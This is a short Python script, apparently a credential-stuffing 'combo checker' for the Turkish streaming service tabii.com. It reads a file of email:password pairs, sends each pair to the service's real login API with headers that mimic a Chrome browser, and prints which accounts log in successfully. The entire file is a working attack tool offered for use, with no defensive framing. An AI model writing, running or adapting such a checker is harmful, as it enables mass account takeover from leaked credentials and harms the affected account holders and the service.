import requests
class WizardTabii:
    def __init__(self, combo_yolu):
        self.combo_yolu = combo_yolu
        self.url = "https://eu1.tabii.com/apigateway/auth/v2/login"
        self.headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "tr",
        "app-version": "1.3.4",
        "content-type": "application/json;charset=UTF-8",
        "device-brand": "Windows",
        "device-connection-type": "Unknown",
        "device-id": "1730231331548_385756",
        "device-language": "tr-TR",
        "device-model": "Windows NT 10.0 - Chrome",
        "device-name": "Windows NT 10.0 - Chrome",
        "device-network": "4g",
        "device-orientation": "Landscape",
        "device-os-name": "Windows",
        "device-os-version": "NT 10.0",
        "device-resolution": "Web",
        "device-timezone": "Europe/Istanbul",
        "device-type": "WEBDesktop",
        "origin": "https://www.tabii.com",
        "platform": "Web",
        "priority": "u=1, i",
        "referer": "https://www.tabii.com/",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "x-country-code": "TR",
        }
    def login_check(self, email, password):
        json_data = {
        "email": email,
        "password": password,
        "remember": False,
        }
        response = requests.post(self.url, headers=self.headers, json=json_data)
        if "Lütfen e-posta adresi ve şifreni kontrol edip tekrar dene." in response.text or "İsteğini gerçekleştiremedik. Lütfen tekrar dene. (Hata Kodu: vE1)" in response.text:
            print(f"\033[1;31mBaşarısız Giriş ❌: {email}:{password}")
        elif "accessToken" in response.text:
            print(f"\033[2;32mBaşarılı Giriş ✅: {email}:{password}")
        else:
            print(f"\033[1;31mBaşarısız Giriş ❌: {email}:{password}")
    def wizard_tool(self):
        with open(self.combo_yolu, "r") as hh:
            for wizard in hh:
                email, password = wizard.strip().split(":")
                self.login_check(email, password)
combo_yolu = input("Combo Yolu: ")
checker = WizardTabii(combo_yolu)
checker.wizard_tool()